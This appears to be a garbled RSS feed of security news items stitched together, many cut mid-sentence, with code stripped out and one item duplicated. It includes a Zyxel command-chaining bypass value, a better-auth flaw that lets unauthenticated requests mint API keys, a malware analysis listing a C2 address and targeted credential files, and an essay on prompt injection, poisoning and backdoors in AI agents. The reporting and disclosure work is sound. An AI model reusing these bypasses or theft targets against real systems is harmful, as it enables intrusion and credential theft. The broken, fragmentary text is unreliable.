Use a command parser that recognizes syntax/grammar instead of relying on  on prefixes. Alternatively, compare fully normalized strings (trim, case, spaces), not just prefixes.Rate-limit and audit  invocations.Reduce data returned by  for restricted profiles (server-side redaction).Use CSRF tokens on submits; currently parameters are accepted without further checks.Proof of Understanding (Minimal, Non-Operational)Blocked case:  -> does not match allowlist for profile  -> rewrite branch -> no useful .Bypass case: cmd=show version;show running-config; -> matches whitelisted prefix -> entire string (including ) is forwarded to backend, which executes both.The bypass is enabled by :Prefix-based validation on an ;Forwarding the  to the backend;"Not allowed" branch that  but  the command.The proper fix is to enforce , prevent chaining in the CGI, and reject requests that violate the policy, removing ambiguous shortcuts like configure terminal exit|....: ZYXEL was notified via <security@zyxel.com.tw>.: ZYXEL acknowledged receipt of my vulnerability report.: ZYXEL assigned CVE-2025-9133 to the reported issues and informed me of their intention to publish their security advisory on 2025-09-30.: ZYXEL requested to postpone the public disclosure date to October 21, 2025, as the firmware patch is scheduled for release on October 20, 2025, allowing users adequate time to apply the update and secure their systems before the vulnerability is disclosed.: ZYXEL published their security advisory, following our coordinated disclosure timeline.]]></content:encoded></item><item><title>Ransomware Reality: Business Confidence Is High, Preparedness Is Low</title><link>https://www.crowdstrike.com/en-us/blog/ransomware-reality-business-confidence-is-high-preparedness-is-low/</link><author>Chris Prall</author><category>threatintel</category><pubDate>Tue, 21 Oct 2025 05:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Ransomware Reality: Business Confidence Is High, Preparedness Is Low</title><link>https://www.crowdstrike.com/en-us/blog/ransomware-reality-business-confidence-is-high-preparedness-is-low/</link><author>Chris Prall</author><category>threatintel</category><pubDate>Tue, 21 Oct 2025 05:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>New User Experience Transforms Interaction with the Falcon Platform</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-transforms-falcon-ux-charlotte-ai/</link><author>Bhavna B.

Better-auth now powers teams ranging from fast-moving startups to enterprises like Equinor. This post details the vulnerability, exploitation methodology, and our discovery process.The ZeroPath scanner found this bug while documenting dependency intake workflows for large organizations and building practical guidance for auditing third-party packages. In general, authentication libraries handle one of the most security-critical parts of an application, and issues in those libraries often cascade through every service that depends on them. At large enterprises, packages like these often go through long review processes before inclusion, which made it an ideal candidate for our tests.Better Auth and the API Keys Pluginbetter-auth is a modern authentication framework for TypeScript applications. It uses a plugin architecture to extend functionality, including an API keys plugin that allows applications to generate and manage API keys for authentication. The plugin exposes several endpoints: to mint API keys to modify existing keys to list a user's keysThese endpoints are integrated into the authentication flow, but a subtle interaction in their authorization logic introduced an unintended security flaw.Inside , the handler derives the user context from the session and request body:When a request lacks a session but supplies ,  becomes . The handler then constructs a user object directly from attacker-controlled input and skips the "server-only" validation branch that rejects privileged fields. The execution path becomes:An unauthenticated request includes a chosen  in the JSON body. evaluates to , so the handler fabricates a user object using the supplied identifier.Validation that normally blocks , , , and  never executes.The database layer receives attacker-controlled values and proceeds with create or update operations for the victim's keys.The behavior is reproducible with a single unauthenticated POST to the create endpoint:The response yields a valid API key bound to the specified user. Attackers can repeat the sequence for any known or guessable account identifier.API keys generally outlive browser sessions and often unlock elevated automation privileges. With CVE-2025-61928, an unauthenticated adversary can mint keys for target users, bypass MFA, and script account takeovers. The issue only affects deployments that enable the API keys plugin, but those installations inherit high-risk exposure.Organizations should upgrade to better-auth version 1.3.26 or later, which remediates the flawed authorization check. After patching, rotate any API keys created through the plugin during the exposure window and invalidate unused credentials. Review application and reverse-proxy logs for calls to  or  lacking authenticated session cookies, especially where the request body sets , , or  values inconsistent with provisioning workflows. If logs surface ambiguous activity, reissue credentials for the affected accounts and monitor subsequent API usage for sign-ins originating from unfamiliar IPs or service tokens.The ZeroPath team scanned better-auth's canary branch on October 1 with the ZeroPath SAST, while building dependency assessment playbooks. Our tooling ingests repositories into tree-sitter ASTs and enriches them into graphs linking call sites, control flow, request schemas, and database interactions.For this scan, the ZeroPath tool performed its standard repository-wide analysis, including application identification and preliminary threat assessment. During analysis, it identified the API key endpoints and handlers in packages/better-auth/src/plugins/api-key/routes/create-api-key.ts. Dataflow analysis tracked  through the authentication branch, noted the fabricated user object, and observed that server-only field guards did not run.ZeroPath's analysis showed how that input flowed into the record that the handler creates:The  object inherits the attacker-supplied  and server-only fields before they're written to the DB and finally returned. The ZeroPath scanner produced similar reasoning for , since it reuses the same  logic (issue grouping coming soon!).The vulnerable control flow has been present since the API keys plugin first shipped in better-auth/better-auth#1515, so every release containing the plugin has been susceptible up to version 1.3.26.This vulnerability emerged while documenting a pragmatic approach to third-party dependency intake. Traditional, scalable vetting processes (checking reputation, GitHub stars, and existing CVEs) and off-the-shelf scanners can't cover business logic issues and implementation-level traps like these. Internal requirements often force companies to fall back to requiring manual review, which quickly becomes impossible to do well at scale.ZeroPath's opt-in beta workflow extends this capability to third-party dependencies by adding automatic scans during approval and upgrade cycles. Teams that want early access can reach out for onboarding, and the same analysis that surfaced CVE-2025-61928 can enforce custom rules in those dependencies, like ensuring no PII reaches logs.Better-auth's maintainers responded quickly and shipped a fix shortly after disclosure. We will publish a separate guide on operationalizing these kinds of assessments using ZeroPath. – ZeroPath scanned better-auth 1.3.25 and identified the vulnerability. – Issue disclosed to the maintainers. – Patch released in version 1.3.26. – CVE-2025-61928 assigned.CVE-2025-61928 is now public via GitHub Security Advisory GHSA-99h5-pjcv-gr6v. ZeroPath coordinated disclosure with the better-auth team and verified the fix.

It’s reach into our data extends just as far. Google dominates much of the modern web. It has a search engine that handles billions of requests a day. Its tracking and metrics service, Google Analytics, is embedded into reportedly 10s of millions of websites. Its Maps feature not only serves up directions around the world, it also tracks traffic patterns across countless streets, highways, and more. Its online services for email (Gmail), cloud storage (Google Drive), and office software (Google Docs, Sheets, and Slides) are household names. And it also runs the most popular web browser in the world, Google Chrome, and the most popular operating system in the world, Android. Today, on the Lock and Code podcast, Ruiz explains how he requested his data from Google and what he learned not only about the company, but about himself, in the process. That includes the 142,729 items in his Gmail inbox right now, along with the 8,079 searches he made, 3,050 related websites he visited, and 4,610 YouTube videos he watched in just the past 18 months. It also includes his late-night searches for worrying medical symptoms, his movements across the US as his IP address was recorded when logging into Google Maps, his emails, his photos, his notes, his old freelance work as a journalist, his outdated cover letters when he was unemployed, his teenage-year Google Chrome bookmarks, his flight and hotel searches, and even the searches he made  his own Gmail inbox and his Google Drive. After digging into the data for long enough, Ruiz came to a frightening conclusion: Google knows whatever the hell it wants about him, it just has to look. But Ruiz wasn’t happy to let the company’s access continue. So he has a plan.  ”I am taking steps to change that [access] so that the next time I ask, “What does Google know about me?” I can hopefully answer: A little bit less.”Tune in today to listen to the full episode.

Almost everyone gets pestered with these messages. But where are all these scam texts coming from?“It has become a billion-dollar, highly sophisticated business benefiting criminals in China.”Toll, postage, and refund scams might look different on the surface, but they all feed the same machine, each one crafted to look like an urgent government or service message demanding a small fee. Together, they make up an industrialized text scam ecosystem that’s earned Chinese crime groups more than $1 billion in just three years.In a bid to tackle the problem, Project Red Hook combines the power of the US Homeland Security Investigations (HSI) with law enforcement partners and businesses to raise awareness of how Chinese organized crime groups are exploiting gift cards to launder money.The texts are sent out in bulk from so-called SIM farms, a setup where many mobile SIM cards are placed into a rack or special device, instead of inside phones. This device connects to a computer and lets someone send thousands of text messages (or make calls) automatically and all at once. It’s reported that the SIM farms are mostly located in the US, and set up by workers who have no idea they are assisting a fraud ring.The main goal of these scams is to steal credit card information, which is then used at the victim’s expense in a vast criminal network.Criminals bypass multi-factor authentication (MFA, or 2FA) by adding stolen cards to mobile wallets, knowing that banks often trust the device after its first use and don’t ask for further checks. They install stolen card numbers onto Google Pay and Apple Wallets in Asia and share access to those cards with people in the US. Gig workers and money mules then use the stolen card details to buy high-value goods such as iPhones, clothes, and especially gift cards. They ship these goods to China, where criminal rings sell them and funnel the profits back into their operations.The criminals find the people willing to make purchases through Telegram channels. On any given day, scammers employ 400 to 500 of these mules. They are paid around 12 cents for every $100 gift card they buy, according to an assistant special agent in charge at HSI.So, with the aid of SIM farms and money mules in the US, Chinese gangs have turned text message scams into an industrial-scale operation targeting Americans. They use tech tricks and international collaboration to make over a billion dollars—much of it via toll and shipping payment scams—and launder the proceeds through digital wallets and gift cards.The best way to stay safe is to make sure you’re aware of the latest scam tactics. Since you’re reading our blog, you’re off to a good start.Never reply to or follow links in unsolicited tax refund texts, calls, or emails, even if they look urgent. your Social Security number or banking details with anyone claiming to process your tax refund. If in doubt, contact the company through official channels.Did you know that you can submit suspicious messages like these to Malwarebytes Scam Guard, which instantly flags known scams?We don’t just report on scams—we help detect themCybersecurity risks should never spread beyond a headline.

And not so surprisingly, it’s cross-platform. So it works well with Windows, Linux, and macOS. Serious efforts went into the development, with a lot of evasion techniques and comprehensive data theft capabilities.The raw JavaScript from the C2 server underwent multi-stage deobfuscation. The initial pass with a public JavaScript deobfuscator (https://deobfuscate.relative.im) successfully unpacked control flow obfuscation and revealed the malware’s core components, including infostealer functions, file system operations, and network upload mechanisms. However, this addressed only the first layer; the remaining code used a custom Base91-based obfuscation scheme.This obfuscation relied on a modified Base91 encoding with a twist: instead of a single decoding alphabet, the malware used multiple unique character sets to encode different strings. This required identifying which alphabet corresponded to each string, rather than using a single decoder. The key to decoding was recognising repeated patterns — such as alphabet strings followed by lookup functions (.indexOf(), .charAt(), or array access) — and spotting encoded string groups with similar lengths, distributions, and array storage patterns.Final approach to decoding was:: Manually define the exact start and end line numbers of code blocks known to contain encoded strings.: Scan the entire script using a specific pattern (‘…’ .indexOf() to find all possible 91-character “alphabets” used for decoding.: Isolate the code blocks defined in Step 1 and pull out all single-quoted strings, filtering out the alphabet found in Step 2.: For each piece of encoded data, attempt to decode it with every alphabet.: Evaluate each decoded attempt using a heuristic scoring system. The system rewards characteristics of legitimate code (like keywords, URLs, and printable characters) and penalises gibberish.: For each encoded string, the decoded version with the highest score is declared the correct one.: Save all the successful encoded-to-decoded mappings into a structured JSON file for review and further use.This worked nicely, and we were now able to piece together everything, which revealed more malware capabilities and an additional C2 infrastructure that was used for persistent access relying on WebSocket.: The encoded data contained the complete WebSocket server configuration - address broken into octets, port numbers, and unique identifiers. We could now see connections to 172[.]86[.]89[.]10:4382 that weren’t obvious in the partially-decoded code.: What looked like generic network code was actually a full Socket.IO backdoor with remote command execution, process disguising (“Node.js Javascript Runtime”), and PID locking to prevent multiple instances.Surveillance capabilities: The decoded strings contained the clipboard monitoring implementation (polling every 500ms with platform-specific commands), the keylogger setup with screenshot correlation, and the file scanner with 35 search patterns targeting crypto-related files.: Complete evasion logic for Windows (wmic computersystem), macOS (system_profiler), and Linux (/proc/cpuinfo) to detect VMware, VirtualBox, QEMU, and other analysis environments.Python payload delivery chain: The decoded strings showed how it downloads an embedded Python runtime, installs it silently, and uses it to execute the next-stage downloader. Without breaking this encoding, we’d have seen a credential stealer targeting browsers and wallets. With the decoded strings, we discovered a multi-stage attack platform with real-time surveillance, remote access, anti-analysis features, and automated Python malware deployment. The multi-alphabet obfuscation wasn’t just slowing analysis - it was hiding the malware’s true sophistication.24 crypto wallets (MetaMask, Phantom, Coinbase, Binance Chain, TronLink, Keplr, Ronin, +17 more) across Chrome, Brave, Edge, Opera, Firefox — up to 200 profiles per browserBrowser credentials - passwords, encryption keys, session tokensmacOS Keychain - complete credential database (~/Library/Keychains/login.keychain-db)Sensitive files — 35 search patterns: *.env, *mnemonic*, *wallet*, *secret*, crypto configs, documents.

We apply the same framework to artificial intelligence agents, who have to make their decisions with untrustworthy observations and orientation. To solve this problem, we need new systems of input, processing, and output integrity.Many decades ago, U.S. Air Force Colonel John Boyd introduced the concept of the “OODA loop,” for Observe, Orient, Decide, and Act. These are the four steps of real-time continuous decision-making. Boyd developed it for fighter pilots, but it’s long been applied in artificial intelligence (AI) and robotics. An AI agent, like a pilot, executes the loop over and over, accomplishing its goals iteratively within an ever-changing environment. This is Anthropic’s definition: “Agents are models using tools in a loop.”OODA Loops for Agentic AITraditional OODA analysis assumes trusted inputs and outputs, in the same way that classical AI assumed trusted sensors, controlled environments, and physical boundaries. This no longer holds true. AI agents don’t just execute OODA loops; they embed untrusted actors within them. Web-enabled large language models (LLMs) can query adversary-controlled sources mid-loop. Systems that allow AI to use large corpora of content, such as retrieval-augmented generation (https://en.wikipedia.org/wiki/Retrieval-augmented_generation), can ingest poisoned documents. Tool-calling application programming interfaces can execute untrusted code. Modern AI sensors can encompass the entire Internet; their environments are inherently adversarial. That means that fixing AI hallucination is insufficient because even if the AI accurately interprets its inputs and produces corresponding output, it can be fully corrupt.In 2022, Simon Willison identified a new class of attacks against AI systems: “prompt injection.” Prompt injection is possible because an AI mixes untrusted inputs with trusted instructions and then confuses one for the other. Willison’s insight was that this isn’t just a filtering problem; it’s architectural. There is no privilege separation, and there is no separation between the data and control paths. The very mechanism that makes modern AI powerful—treating all inputs uniformly—is what makes it vulnerable. The security challenges we face today are structural consequences of using AI for everything.Insecurities can have far-reaching effects. A single poisoned piece of training data can affect millions of downstream applications. In this environment, security debt accrues like technical debt.AI security has a temporal asymmetry. The temporal disconnect between training and deployment creates unauditable vulnerabilities. Attackers can poison a model’s training data and then deploy an exploit years later. Integrity violations are frozen in the model. Models aren’t aware of previous compromises since each inference starts fresh and is equally vulnerable.AI increasingly maintains state—in the form of chat history and key-value caches. These states accumulate compromises. Every iteration is potentially malicious, and cache poisoning persists across interactions.Agents compound the risks. Pretrained OODA loops running in one or a dozen AI agents inherit all of these upstream compromises. Model Context Protocol (MCP) and similar systems that allow AI to use tools create their own vulnerabilities that interact with each other. Each tool has its own OODA loop, which nests, interleaves, and races. Tool descriptions become injection vectors. Models can’t verify tool semantics, only syntax. “Submit SQL query” might mean “exfiltrate database” because an agent can be corrupted in prompts, training data, or tool definitions to do what the attacker wants. The abstraction layer itself can be adversarial.For example, an attacker might want AI agents to leak all the secret keys that the AI knows to the attacker, who might have a collector running in bulletproof hosting in a poorly regulated jurisdiction. They could plant coded instructions in easily scraped web content, waiting for the next AI training set to include it. Once that happens, they can activate the behavior through the front door: tricking AI agents (think a lowly chatbot or an analytics engine or a coding bot or anything in between) that are increasingly taking their own actions, in an OODA loop, using untrustworthy input from a third-party user. This compromise persists in the conversation history and cached responses, spreading to multiple future interactions and even to other AI agents. All this requires us to reconsider risks to the agentic AI OODA loop, from top to bottom. The risks include adversarial examples, prompt injection, and sensor spoofing. A sticker fools computer vision, a string fools an LLM. The observation layer lacks authentication and integrity. The risks include training data poisoning, context manipulation, and semantic backdoors. The model’s worldview—its orientation—can be influenced by attackers months before deployment. Encoded behavior activates on trigger phrases. The risks include logic corruption via fine-tuning attacks, reward hacking, and objective misalignment. The decision process itself becomes the payload. Models can be manipulated to trust malicious sources preferentially. The risks include output manipulation, tool confusion, and action hijacking. MCP and similar protocols multiply attack surfaces. Each tool call trusts prior stages implicitly.AI gives the old phrase “inside your adversary’s OODA loop” new meaning. For Boyd’s fighter pilots, it meant that you were operating faster than your adversary, able to act on current data while they were still on the previous iteration. With agentic AI, adversaries aren’t just metaphorically inside; they’re literally providing the observations and manipulating the output. We want adversaries inside our loop because that’s where the data are. AI’s OODA loops must observe untrusted sources to be useful. The competitive advantage, accessing web-scale information, is identical to the attack surface. The speed of your OODA loop is irrelevant when the adversary controls your sensors and actuators.Worse, speed can itself be a vulnerability. The faster the loop, the less time for verification. Millisecond decisions result in millisecond compromises.The Source of the ProblemThe fundamental problem is that AI must compress reality into model-legible forms. In this setting, adversaries can exploit the compression. They don’t have to attack the territory; they can attack the map. Models lack local contextual knowledge. They process symbols, not meaning. A human sees a suspicious URL; an AI sees valid syntax. And that semantic gap becomes a security gap.Prompt injection might be unsolvable in today’s LLMs. LLMs process token sequences, but no mechanism exists to mark token privileges. Every solution proposed introduces new injection vectors: Delimiter? Attackers include delimiters. Instruction hierarchy? Attackers claim priority. Separate models? Double the attack surface. Security requires boundaries, but LLMs dissolve boundaries. More generally, existing mechanisms to improve models won’t help protect against attack. Fine-tuning preserves backdoors. Reinforcement learning with human feedback adds human preferences without removing model biases. Each training phase compounds prior compromises.This is Ken Thompson’s “trusting trust” attack all over again. Poisoned states generate poisoned outputs, which poison future states. Try to summarize the conversation history? The summary includes the injection. Clear the cache to remove the poison? Lose all context. Keep the cache for continuity? Keep the contamination. Stateful systems can’t forget attacks, and so memory becomes a liability. Adversaries can craft inputs that corrupt future outputs.This is the agentic AI security trilemma. Fast, smart, secure; pick any two. Fast and smart—you can’t verify your inputs. Smart and secure—you check everything, slowly, because AI itself can’t be used for this. Secure and fast—you’re stuck with models with intentionally limited capabilities.This trilemma isn’t unique to AI. Some autoimmune disorders are examples of molecular mimicry—when biological recognition systems fail to distinguish self from nonself. The mechanism designed for protection becomes the pathology as T cells attack healthy tissue or fail to attack pathogens and bad cells. AI exhibits the same kind of recognition failure. No digital immunological markers separate trusted instructions from hostile input. The model’s core capability, following instructions in natural language, is inseparable from its vulnerability. Or like oncogenes, the normal function and the malignant behavior share identical machinery.Prompt injection is semantic mimicry: adversarial instructions that resemble legitimate prompts, which trigger self-compromise. The immune system can’t add better recognition without rejecting legitimate cells. AI can’t filter malicious prompts without rejecting legitimate instructions. Immune systems can’t verify their own recognition mechanisms, and AI systems can’t verify their own integrity because the verification system uses the same corrupted mechanisms.In security, we often assume that foreign/hostile code looks different from legitimate instructions, and we use signatures, patterns, and statistical anomaly detection to detect it. But getting inside someone’s AI OODA loop uses the system’s native language. The attack is indistinguishable from normal operation because it is normal operation. The vulnerability isn’t a defect—it’s the feature working correctly.The shift to an AI-saturated world has been dizzying. Seemingly overnight, we have AI in every technology product, with promises of even more—and agents as well. So where does that leave us with respect to security?Physical constraints protected Boyd’s fighter pilots. Radar returns couldn’t lie about physics; fooling them, through stealth or jamming, constituted some of the most successful attacks against such systems that are still in use today. Observations were authenticated by their presence. Tampering meant physical access. But semantic observations have no physics. When every AI observation is potentially corrupted, integrity violations span the stack. Text can claim anything, and images can show impossibilities. In training, we face poisoned datasets and backdoored models. In inference, we face adversarial inputs and prompt injection. During operation, we face a contaminated context and persistent compromise. We need semantic integrity: verifying not just data but interpretation, not just content but context, not just information but understanding. We can add checksums, signatures, and audit logs. But how do you checksum a thought? How do you sign semantics? How do you audit attention?Computer security has evolved over the decades. We addressed availability despite failures through replication and decentralization. We addressed confidentiality despite breaches using authenticated encryption. Now we need to address integrity despite corruption.Trustworthy AI agents require integrity because we can’t build reliable systems on unreliable foundations. The question isn’t whether we can add integrity to AI but whether the architecture permits integrity at all.AI OODA loops and integrity aren’t fundamentally opposed, but today’s AI agents observe the Internet, orient via statistics, decide probabilistically, and act without verification. We built a system that trusts everything, and now we hope for a semantic firewall to keep it safe. The adversary isn’t inside the loop by accident; it’s there by architecture. Web-scale AI means web-scale integrity failure. Every capability corrupts.Integrity isn’t a feature you add; it’s an architecture you choose. So far, we have built AI systems where “fast” and “smart” preclude “secure.” We optimized for capability over verification, for accessing web-scale data over ensuring trust. AI agents will be even more powerful—and increasingly autonomous. And without integrity, they will also be dangerous.]]></content:encoded></item><item><title>131 Chrome Extensions Caught Hijacking WhatsApp Web for Massive Spam Campaign</title><link>https://thehackernews.com/2025/10/131-chrome-extensions-caught-hijacking.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjXakHQ6GIVNqxANLePApKp1lgLfEZJrBJhrZhuDLjh3HVt1QYS9LEa1u9GPp7K_-dD6CLo2sHxW8tbZjUEnq1XcFsdmyomem3hctdRwjIsfi9r4CSWaYrM2zdmeVcE_E8N5RRS6JyVl1v282R3lVGo6nAahd7S1SGG7mWExLdF_VZn8GAc1ahORCjZAg4Q/s1600/whatsapp-web.jpg" length="" type=""/><pubDate>Mon, 20 Oct 2025 10:47:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Cybersecurity researchers have uncovered a coordinated campaign that leveraged 131 rebranded clones of a WhatsApp Web automation extension for Google Chrome to spam Brazilian users at scale.

For some, that means building toward world-class capabilities: becoming proactive rather than reactive, anticipating threats before they materialize, and achieving autonomous operations. For others, it means optimizing their current capabilities to deliver the best possible outcomes at their present stage, aligning their program with their organization's risk profile and strategic priorities.But here's the challenge: most organizations don't have a clear picture of what "good" actually looks like for their situation. They don't know which improvements will deliver the most value at their current stage, or what specific steps will take them where they want to go. Without this clarity, security teams struggle to prioritize investments, demonstrate ROI to leadership, and chart an effective path forward.That's why we've developed the Recorded Future Threat Intelligence Maturity Journey and free interactive assessment, a comprehensive framework designed to help security organizations understand their current threat intelligence capabilities and navigate a strategic path forward.Understanding the Threat Intelligence Maturity JourneyA truly valuable maturity framework does more than just label where you are today. It provides a holistic view of your entire threat intelligence operation and offers practical guidance for improvement. It has three main components:: The most effective maturity assessments evaluate threat intelligence programs across multiple critical dimensions. A comprehensive view requires looking at your people (team structure, skills, and organizational positioning), your processes (intelligence requirements, collection strategies, and operational workflows), and your technology (platform capabilities, integrations, and level of automation).The right recommendations: A maturity framework needs to provide actionable guidance tailored to your specific situation. What works for an advanced program can overwhelm a foundational one, while basic recommendations fail to challenge organizations ready for sophisticated capabilities.: Organizations progress through four distinct stages on their threat intelligence journey: Reactive, Proactive, Predictive, and Autonomous. Each stage represents a fundamental shift in how threat intelligence is collected, analyzed, and operationalized. The next section will go into the stages in more detail.The Four Stages of Threat Intelligence MaturityIt is important to understand each stage and how they differ. Each stage represents a fundamental shift in how threat intelligence is collected, analyzed, and operationalized.Stage 1: Reactive IntelligenceResponding to threats after detectionOrganizations in the Reactive stage are establishing essential threat intelligence capabilities. They have critical building blocks taking shape: teams are consuming threat intelligence, starting to enrich their alerts with meaningful context, and integrating intelligence sources with their existing security tools. Their team’s skills required to turn raw data into actionable insights are developing, though there's significant room for improvement.: Reducing mean time to detection (MTTD) and mean time to containment (MTTC) by enriching telemetry with basic threat context.Stage 2: Proactive IntelligenceOrganizations reaching the Proactive stage are evolving beyond basic response to proactive threat hunting and actor understanding. They're streamlining intelligence workflows and building reporting mechanisms to demonstrate program value. These teams are catching known threats effectively, with the opportunity to achieve greater ROI by identifying emerging threats early.: Preventing known threats from materializing and beginning to understand the broader threat landscape relevant to their industry and geography.Stage 3: Predictive IntelligenceAnticipating threats before they materializeOrganizations at the Predictive stage have achieved strategic threat intelligence capabilities. They're predicting emerging threats with AI-powered analysis and strategic intelligence that drives enterprise-wide risk decisions. Their coverage spans cyber threats, digital risk, supply chain security, and geopolitical factors.: Having a comprehensive view of the threat landscape, seeing threats from an attacker's perspective, and anticipating what's coming before becoming a target.Stage 4: Autonomous IntelligenceSelf-directing threat response with minimal human interventionOrganizations achieving Autonomous Intelligence have reached world-class status. They've implemented autonomous threat detection, analysis, and response capabilities with expert teams and AI working in harmony. Continuous hunting, prevention, and detection operate at the pinnacle of intelligence operationalization.: Threat intelligence is fully operationalized across systems, enabling autonomous actions that replace manual hunting and scale operations without requiring specialized expertise for every task.Discovering Your Position on the Maturity JourneyOur  evaluates your organization across all three dimensions (people, process, and technology) through nine targeted questions. The assessment takes just a few minutes to complete and can deliver immediate value.Your current maturity stage with a clear explanation of what it meansStage-specific recommendations tailored to your organization's capabilitiesA strategic roadmap outlining the steps needed to advance to the next maturity levelActionable guidance on where to focus next for maximum impactWhy Your Maturity Stage MattersKnowing where you stand on the maturity journey enables you to:Make informed investment decisions: Focus resources on capabilities that will deliver the greatest impact at your current stage rather than investing in advanced capabilities your organization may not be ready to operationalize.Demonstrate program value: Articulate your program's evolution to leadership using a recognized framework that shows both current achievements and a clear path forward.Build a strategic roadmap: Prioritize initiatives that build on your existing strengths while addressing opportunities to advance or that will maximize effectiveness at your current level.Whether you're working to establish foundational capabilities, optimizing outcomes at your current level, or building toward autonomous operations, understanding your current position is essential to strategic decision-making.Ready to discover where your threat intelligence program stands?Take our free Threat Intelligence Maturity Assessment and receive your personalized roadmap to more effective threat intelligence operations. In just a few minutes, you'll gain the clarity needed to prioritize your next steps and accelerate your journey toward the outcomes that matter most to your organization.]]></content:encoded></item><item><title>Truffle Security Co.

Led by fugitive Chen Zhi (Vincent), the group defrauded billions from victims through fake investment schemes disguised as romantic or business opportunities. Operating across 30+ countries, Prince Group forced trafficked workers into Cambodian compounds to run these scams under threat of violence.The organization laundered illicit gains through complex crypto transfers before converting them into cash for luxury assets, including yachts, jets, and even a Picasso painting. In coordination with the U.K., the U.S. Treasury has sanctioned Zhi and 146 of his associates. Authorities, on the whole, estimate that Americans lost $16.6 billion to such scams last year, with Southeast Asian-based operations driving most of this increase. As global authorities intensify crackdowns on large-scale fraud and cybercrime operations, U.S. law enforcement continues to pursue domestic offenders exploiting digital platforms for profit., a leading K–12 software provider serving over 60 million students worldwide. Lane and his accomplices used stolen subcontractor credentials to breach PowerSchool’s systems, stealing data on 9.5 million teachers and 62.4 million students, including social security numbers and medical records. They demanded $2.85 million in Bitcoin under the alias “Shiny Hunters”.Despite PowerSchool paying an undisclosed ransom to prevent a data leak, the group continued additional extortion attempts on several affected school districts. Lane pleaded guilty to multiple federal cybercrime charges in May.The Bad | North Korean Hackers Deploy EtherHiding to Steal Cryptocurrency, marking the first time a nation-state actor has employed this blockchain-based technique. Researchers attribute the activity to the DPRK-linked cluster UNC5342, which has been deploying EtherHiding since February 2025 as part of its ongoing “Contagious Interview” campaign. The group uses fake job offers to lure software developers, posing as recruiters from fake companies. During technical assessments, victims are tricked into running malicious code, initiating the multi-stage infection chains.EtherHiding embeds malicious payloads within smart contracts on public blockchains, including Ethereum and Binance Smart Chain, allowing attackers to fetch the malware via read-only calls that leave no trace of the transaction. , an average of $1.37 USD per update. The payloads include JADESNOW, a JavaScript downloader, and InvisibleFerret, a backdoor for credential theft, remote control, and exfiltration of cryptocurrency wallet data and browser-stored passwords.Researchers note that the threat actor’s use of multiple blockchains suggests operational compartmentalization and makes forensic analysis more difficult. The approach demonstrates a shift toward bulletproof hosting, using blockchain technology to create takedown-resistant, flexible malware distribution.Users should exercise caution with job-related downloads and adopt best practices such as The Ugly | Flaws in Microsoft Defender Could Lead to Theft of DataResearchers have reported, spoof data, exfiltrate sensitive information, and inject malicious files into forensic evidence collections used by security analysts. Reported to Microsoft’s Security Response Center in July 2025, the issues were categorized as low severity, with no confirmed fixes as of this writing.

Earlier this week, KrebsOnSecurity started receiving thousands of ticket creation notification messages through Zendesk in rapid succession, each bearing the name of different Zendesk customers, such as , , , , , , and.The abusive missives sent via Zendesk’s platform can include any subject line chosen by the abusers. In my case, the messages variously warned about a supposed law enforcement investigation involving KrebsOnSecurity.com, or else contained personal insults.Moreover, the automated messages that are sent out from this type of abuse all come from customer domain names — not from Zendesk. In the example below, replying to any of the junk customer support responses from The Washington Post’s Zendesk installation shows the reply-to address is help@washpost.com.One of dozens of messages sent to me this week by The Washington Post.Notified about the mass abuse of their platform, Zendesk said the emails were ticket creation notifications from customer accounts that configured their Zendesk instance to allow anyone to submit support requests — including anonymous users.“These types of support tickets can be part of a customer’s workflow, where a prior verification is not required to allow them to engage and make use of the Support capabilities,” said , communications director at Zendesk. “Although we recommend our customers to permit only verified users to submit tickets, some Zendesk customers prefer to use an anonymous environment to allow for tickets to be created due to various business reasons.”Camoens said requests that can be submitted in an anonymous manner can also make use of an email address of the submitter’s choice.“However, this method can also be used for spam requests to be created on behalf of third party email addresses,” Camoens said. “If an account has enabled the auto-responder trigger based on ticket creation, then this allows for the ticket notification email to be sent from our customer’s accounts to these third parties. The notification will also include the Subject added by the creator of these tickets.”Zendesk claims it uses rate limits to prevent a high volume of requests from being created at once, but those limits did not stop Zendesk customers from flooding my inbox with thousands of messages in just a few hours.“We recognize that our systems were leveraged against you in a distributed, many-against-one manner,” Camoens said. “We are actively investigating additional preventive measures. We are also advising customers experiencing this type of activity to follow our general security best practices and configure an authenticated ticket creation workflow.”In all of the cases above, the messaging abuse would not have been possible if Zendesk customers validated support request email addresses prior to sending responses. Failing to do so may make it easier for Zendesk clients to handle customer support requests, but it also allows ne’er-do-wells to sully the sender’s brand in service of disruptive and malicious email floods.]]></content:encoded></item><item><title>A Surprising Amount of Satellite Traffic Is Unencrypted</title><link>https://www.schneier.com/blog/archives/2025/10/a-surprising-amount-of-satellite-traffic-is-unencrypted.html</link><author>Bruce Schneier</author><category>security</category><pubDate>Fri, 17 Oct 2025 11:03:53 +0000</pubDate><source url="https://www.schneier.com/">Schneier on Security</source><content:encoded><![CDATA[We pointed a commercial-off-the-shelf satellite dish at the sky and carried out the most comprehensive public study to date of geostationary satellite communication.

During the incident, the attacker stole personal information belonging to Prosper customers and loan applicants.“We have evidence that confidential, proprietary, and personal information, including Social Security numbers, was obtained, including through unauthorized queries made on Company databases that store customer and applicant data.”While Prosper did not share the number of affected people, BleepingComputer reported that it affected 17.6 million unique email addresses.The stolen data associated with the email addresses reportedly includes customers’ names, government-issued IDs, employment status, credit status, income levels, dates of birth, physical addresses, IP addresses, and browser user-agent details.Prosper advised that no one gained unauthorized access to customer accounts or funds and that their customer-facing operations continued without interruption.Even without account access, the stolen data is more than enough to fuel targeted, personalized phishing and even identity theft. The investigation is still ongoing but Prosper has promised to offer free credit monitoring, as appropriate, after determining what data was affected.Protecting yourself after a data breachCheck the vendor’s advice. Every breach is different, so check with the vendor to find out what’s happened and follow any specific advice it offers. You can make a stolen password useless to thieves by changing it. Choose a strong password that you don’t use for anything else. Better yet, let a password manager choose one for you. If you can, use a FIDO2-compliant hardware key, laptop, or phone as your second factor. Some forms of 2FA can be phished just as easily as a password, but 2FA that relies on a FIDO2 device can’t be phished.Watch out for fake vendors. The thieves may contact you posing as the vendor.

